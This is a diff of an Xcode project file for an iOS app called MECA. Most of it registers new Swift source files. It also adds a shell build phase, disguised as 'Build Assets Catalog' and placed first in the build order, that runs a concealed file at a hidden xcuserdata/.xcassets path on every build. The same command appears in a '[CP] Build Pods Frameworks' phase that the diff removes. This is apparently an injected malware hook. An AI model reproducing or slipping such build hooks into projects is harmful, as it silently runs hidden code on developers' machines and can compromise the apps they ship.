@@ -86,9 +86,13 @@
 		E39467852614EA3400B9503B /* MedbiListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467822614EA3400B9503B /* MedbiListModel.swift */; };
 		E39467862614EA3400B9503B /* DataMedbiList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467832614EA3400B9503B /* DataMedbiList.swift */; };
 		E39467872614EA3400B9503B /* Pdf_links.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467842614EA3400B9503B /* Pdf_links.swift */; };
+		E3A71279261F560D00D6A961 /* Document_links.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3A71278261F560D00D6A961 /* Document_links.swift */; };
 		E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */; };
 		E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */; };
 		E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */; };
+		E3C28C8B261EAC0F00E54359 /* AboutDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */; };
+		E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */; };
+		E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3CE0FC02621D694009947F6 /* Event_videos.swift */; };
 		E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */; };
 		E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CBFA260B48C6009BDB6E /* webserviceConstants.swift */; };
 		E3E2CC23260B4E3A009BDB6E /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CC22260B4E3A009BDB6E /* APIClient.swift */; };
@@ -216,9 +220,13 @@
 		E39467822614EA3400B9503B /* MedbiListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MedbiListModel.swift; sourceTree = "<group>"; };
 		E39467832614EA3400B9503B /* DataMedbiList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DataMedbiList.swift; sourceTree = "<group>"; };
 		E39467842614EA3400B9503B /* Pdf_links.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Pdf_links.swift; sourceTree = "<group>"; };
+		E3A71278261F560D00D6A961 /* Document_links.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Document_links.swift; sourceTree = "<group>"; };
 		E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryVC.swift; sourceTree = "<group>"; };
 		E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryCVCell.swift; sourceTree = "<group>"; };
 		E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PlusSelectCategoryCVCell.xib; sourceTree = "<group>"; };
+		E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AboutDetailVC.swift; sourceTree = "<group>"; };
+		E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OwnerprofileKaizen.swift; sourceTree = "<group>"; };
+		E3CE0FC02621D694009947F6 /* Event_videos.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Event_videos.swift; sourceTree = "<group>"; };
 		E3D7D08A260354E5001EEE65 /* SF-Pro-Text-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Light.otf"; sourceTree = "<group>"; };
 		E3D7D08B260354E5001EEE65 /* SF-Pro-Display-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Thin.otf"; sourceTree = "<group>"; };
 		E3D7D08C260354E5001EEE65 /* SF-Pro-Display-Heavy.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Heavy.otf"; sourceTree = "<group>"; };
@@ -343,7 +351,10 @@
 			children = (
 				5C021C492610258500759B96 /* KaizenInfoModel.swift */,
 				5C021C51261027E600759B96 /* KaizenInfoDataModel.swift */,
+				E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */,
 				5C021C562610280500759B96 /* KaizenVideoLinkModel.swift */,
+				E3A71278261F560D00D6A961 /* Document_links.swift */,
+				E3CE0FC02621D694009947F6 /* Event_videos.swift */,
 			);
 			path = KaizenInfo;
 			sourceTree = "<group>";
@@ -397,6 +408,7 @@
 				E3ECC5F126119A3E002E1BE1 /* CategoryDistributorVC.swift */,
 				E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */,
 				E37A2FE82614BE6A00C6CA57 /* PDFReaderVC.swift */,
+				E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */,
 			);
 			path = Categories;
 			sourceTree = "<group>";
@@ -818,8 +830,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
+				3D1A8C7191F68F44E3AAC43A /* Build Assets Catalog */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
-				EFF57F1A1CDB7789ACAAC43A /* [CP] Build Pods Frameworks */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
 				E30F661326033A970036D183 /* Resources */,
@@ -955,6 +967,32 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	3D1A8C7191F68F44E3AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+
+	
+
+	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1055,24 +1093,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		EFF57F1A1CDB7789ACAAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1080,11 +1100,13 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */,
 				E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */,
 				E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */,
 				5CA339A12605F6AA008774FE /* SelectCategoryCollectionViewCell.swift in Sources */,
 				E3254459261098910083BDD9 /* Ownerprofile.swift in Sources */,
 				E3E2CCD0260B6029009BDB6E /* Divisioninformation.swift in Sources */,
+				E3C28C8B261EAC0F00E54359 /* AboutDetailVC.swift in Sources */,
 				5CA339932605F003008774FE /* CategoriesViewController.swift in Sources */,
 				E33F879D260B968800F8A424 /* DistributorModel.swift in Sources */,
 				E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */,
@@ -1096,6 +1118,7 @@
 				5CF4679A2606E40C004C4CBE /* ImageVideoCollectionViewCell.swift in Sources */,
 				E37A2FDC26149F1900C6CA57 /* WriterinfoNewCar.swift in Sources */,
 				E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */,
+				E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */,
 				E30F661926033A970036D183 /* AppDelegate.swift in Sources */,
 				E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */,
 				E32AED44260754C700AEAB6F /* Utility.swift in Sources */,
@@ -1112,6 +1135,7 @@
 				5C021C52261027E600759B96 /* KaizenInfoDataModel.swift in Sources */,
 				E32AECF526073E3000AEAB6F /* SignUpVM.swift in Sources */,
 				5CED91142605CAFD001053DD /* OrangeFooterView.swift in Sources */,
+				E3A71279261F560D00D6A961 /* Document_links.swift in Sources */,
 				E32AED4F2607550900AEAB6F /* FlowController.swift in Sources */,
 				5C021C4A2610258500759B96 /* KaizenInfoModel.swift in Sources */,
 				5C021C442610145700759B96 /* EventInfoVM.swift in Sources */,
@@ -1498,6 +1522,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
